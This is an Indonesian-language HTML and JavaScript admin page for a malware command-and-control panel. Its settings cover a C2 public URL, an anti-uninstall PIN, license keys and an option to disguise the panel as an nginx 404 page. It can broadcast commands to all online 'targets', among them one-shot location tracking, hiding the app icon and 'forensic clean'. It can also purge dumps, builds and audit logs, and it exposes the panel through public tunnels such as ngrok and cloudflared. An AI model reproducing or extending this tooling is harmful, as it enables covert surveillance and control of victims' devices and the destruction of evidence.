<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Admin</title>
<link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
<div class="win" id="win"></div>
<div class="toast-wrap" id="tw"></div>
<script type="module">
import { $, api, post, patch, toast, esc, fmt, copy } from '/static/js/core.js';
import { chrome, statusbar, svg, confirmBox } from '/static/js/ui.js';

const win = $('#win');
chrome(win, {
  page: 'admin', title: 'Admin',
  actions: [
    '<button class="tbtn acc" id="save">' + svg('gear') + 'SIMPAN</button>',
    '<button class="tbtn" id="rf">' + svg('reload') + 'REFRESH</button>',
    '<button class="tbtn" id="bc">' + svg('bolt') + 'BROADCAST</button>',
  ],
});
const body = document.createElement('div');
body.className = 'body pad';
win.appendChild(body);
statusbar(win, '<span class="st"><b>&#9679;</b> ADMIN</span><span class="st" id="lic">&mdash;</span>' +
  '<span class="st-r">v2.1.0</span>');

body.innerHTML = `
<div class="grid g2">
  <div class="card" id="tunnel"><div class="card-h">${svg('tunnel')}TUNNEL PUBLIK</div>
    <div class="card-b">
      <div class="kv">
        <div class="k">Status</div><div class="v" id="tSt">mati</div>
        <div class="k">URL</div><div class="v" id="tUrl">&mdash;</div>
        <div class="k">Engine</div><div class="v" id="tKind">&mdash;</div>
        <div class="k">Tersedia</div><div class="v" id="tAv">&mdash;</div>
      </div>
      <div class="field" style="margin-top:8px"><label>ENGINE</label>
        <select class="inp" id="tSel">
          <option value="auto">AUTO (deteksi)</option><option value="cloudflared">cloudflared</option>
          <option value="ngrok">ngrok</option><option value="bore">bore</option>
          <option value="localx">localtunnel (npx)</option><option value="ssh">ssh localhost.run</option>
        </select></div>
      <div class="row"><button class="btn acc sm" id="tStart">NYALAKAN</button>
        <button class="btn ghost sm" id="tStop">MATIKAN</button>
        <button class="btn ghost sm" id="tCopy">SALIN</button></div>
      <div class="console" id="tLog" style="height:92px;margin-top:7px"></div>
    </div></div>

  <div class="card"><div class="card-h">${svg('gear')}PENGATURAN</div>
    <div class="card-b">
      <div class="field"><label>LICENSE KEY</label><input class="inp" id="license_key"></div>
      <div class="field"><label>C2 PUBLIC URL</label><input class="inp" id="c2_public_url" placeholder="https://..."></div>
      <div class="field"><label>PIN ANTI-UNINSTALL</label><input class="inp" id="uninstall_pin"></div>
      <div class="field"><label>DURASI SESI (JAM)</label>
        <input class="inp" id="session_hours" type="number" min="1" max="720"></div>
      <div class="field"><label>PORT / HOST</label>
        <div class="row"><input class="inp" id="port" type="number" style="flex:1">
        <input class="inp" id="host" style="flex:2"></div></div>
      <label class="check"><input type="checkbox" id="require_license"> WAJIB LICENSE</label>
      <label class="check"><input type="checkbox" id="hide_panel"> SEMBUNYIKAN PANEL (root = 404 nginx)</label>
      <div class="row" style="margin-top:8px">
        <button class="btn ghost sm" id="rotSec">ROTASI SECRET</button>
        <button class="btn ghost sm" id="rotLic">ROTASI LICENSE</button></div>
    </div></div>
</div>

<div class="grid g2">
  <div class="card" id="broadcast"><div class="card-h">${svg('bolt')}BROADCAST</div>
    <div class="card-b">
      <div class="field"><label>PERINTAH</label>
        <select class="inp" id="bcType">
          <option value="ping">PING</option><option value="info">INFO</option>
          <option value="toast">TOAST</option><option value="open_url">BUKA URL</option>
          <option value="locate_once">LOKASI SEKALI</option><option value="vibrate">GETAR</option>
          <option value="hide_icon">SEMBUNYIKAN IKON</option><option value="forensic_clean">FORENSIC CLEAN</option>
        </select></div>
      <div class="field"><label>ARGUMEN (text / url)</label><input class="inp" id="bcArg"></div>
      <button class="btn acc sm" id="bcGo">KIRIM KE SEMUA ONLINE</button>
      <div class="console" id="bcOut" style="height:70px;margin-top:7px"></div>
    </div></div>
  <div class="card"><div class="card-h">${svg('wipe')}PURGE</div>
    <div class="card-b"><div class="chips">
      <button class="chip" data-p="dumps">DUMP</button><button class="chip" data-p="builds">BUILD</button>
      <button class="chip" data-p="targets">TARGET</button><button class="chip" data-p="audit">AUDIT</button>
      <button class="chip" data-p="sessions">SESI</button></div>
      <div class="console" id="audit" style="height:150px;margin-top:9px"></div></div></div>
</div>`;

async function load() {
  try {
    const s = (await api('/api/admin/settings')).settings;
    ['license_key', 'c2_public_url', 'uninstall_pin', 'session_hours', 'port', 'host']
      .forEach((k) => { if ($('#' + k)) $('#' + k).value = s[k] ?? ''; });
    $('#require_license').checked = !!s.require_license;
    $('#hide_panel').checked = !!s.hide_panel;
    $('#lic').textContent = 'license: ' + (s.license_key || '\u2014');
    const a = await api('/api/admin/audit?limit=120');
    $('#audit').innerHTML = a.audit.map((x) =>
      '<div><span class="tm">' + fmt.time(x.ts) + '</span> <span class="cy">' +
      esc(x.event) + '</span> ' + esc(x.detail) + '</div>').join('');
  } catch (e) { toast(e.message, 'wn'); }
}

$('#save').onclick = async () => {
  const b = {};
  ['license_key', 'c2_public_url', 'uninstall_pin', 'port', 'host']
    .forEach((k) => { b[k] = $('#' + k).value; });
  b.session_hours = Number($('#session_hours').value) || 24;
  b.require_license = $('#require_license').checked;
  b.hide_panel = $('#hide_panel').checked;
  try { await patch('/api/admin/settings', b); toast('Disimpan.', 'ok'); load(); }
  catch (e) { toast(e.message, 'wn'); }
};
$('#rotSec').onclick = async () => {
  if (!await confirmBox('ROTASI SECRET', 'Agent lama harus reconnect. Lanjut?')) return;
  await post('/api/admin/rotate-secret');
  toast('Secret dirotasi.', 'ok');
};
$('#rotLic').onclick = async () => {
  if (!await confirmBox('ROTASI LICENSE', 'License baru akan dibuat. Lanjut?')) return;
  const r = await post('/api/admin/rotate-license');
  toast('License baru: ' + r.license, 'ok');
  load();
};
document.querySelectorAll('[data-p]').forEach((b) => {
  b.onclick = async () => {
    if (!await confirmBox('PURGE ' + b.dataset.p.toUpperCase(), 'Data dihapus permanen.')) return;
    await post('/api/admin/purge/' + b.dataset.p);
    toast('Purge selesai.', 'ok');
    load();
  };
});

$('#bcGo').onclick = async () => {
  const type = $('#bcType').value;
  const arg = $('#bcArg').value;
  const args = {};
  if (arg) { args.text = arg; args.url = arg; }
  try {
    const r = await post('/api/targets/broadcast', { type, args });
    $('#bcOut').prepend('<div><span class="tm">' + fmt.time(Date.now() / 1000) + '</span> ' +
      type + ' \u2192 ' + r.sent + ' target</div>');
    toast('Terkirim ke ' + r.sent + ' client.', 'ok');
  } catch (e) { toast(e.message, 'wn'); }
};
$('#bc').onclick = () => $('#broadcast').scrollIntoView({ behavior: 'smooth' });

async function tun() {
  try {
    const s = await api('/api/tunnel/status');
    $('#tSt').textContent = s.on ? 'AKTIF' : 'mati';
    $('#tSt').style.color = s.on ? 'var(--ok)' : 'var(--acc)';
    $('#tUrl').textContent = s.url || '\u2014';
    $('#tKind').textContent = s.kind || '\u2014';
    $('#tAv').textContent = Object.entries(s.available || {})
      .filter(([, v]) => v).map(([k]) => k).join(', ') || 'tidak ada';
    $('#tLog').textContent = (s.log || []).slice(-9).join('\n');
  } catch {}
}
$('#tStart').onclick = async () => {
  try { await post('/api/tunnel/start', { kind: $('#tSel').value }); toast('Tunnel aktif.', 'ok'); }
  catch (e) { toast(e.message, 'wn'); }
  tun();
};
$('#tStop').onclick = async () => { await post('/api/tunnel/stop'); toast('Tunnel mati.'); tun(); };
$('#tCopy').onclick = async () => {
  const s = await api('/api/tunnel/status');
  if (s.url) copy(s.url);
};
$('#rf').onclick = load;

load(); tun();
setInterval(tun, 5000);
if (location.hash === '#tunnel') setTimeout(() => $('#tunnel').scrollIntoView(), 200);
if (location.hash === '#broadcast') setTimeout(() => $('#broadcast').scrollIntoView(), 200);
</script>
</body>
</html>
